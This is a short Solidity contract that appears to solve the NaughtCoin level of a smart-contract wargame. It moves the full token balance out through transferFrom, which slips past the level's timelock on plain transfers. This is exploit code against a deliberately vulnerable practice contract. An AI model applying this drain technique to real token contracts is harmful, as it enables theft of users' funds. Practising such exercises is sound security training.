pragma solidity ^0.8.0;
import "../levels/NaughtCoin.sol";

contract AttackerCorrect {
    function attack(address _instance, address _from) external {
        NaughtCoin(_instance).transferFrom(_from, msg.sender, 1000000000000000000000000);
    }
} 
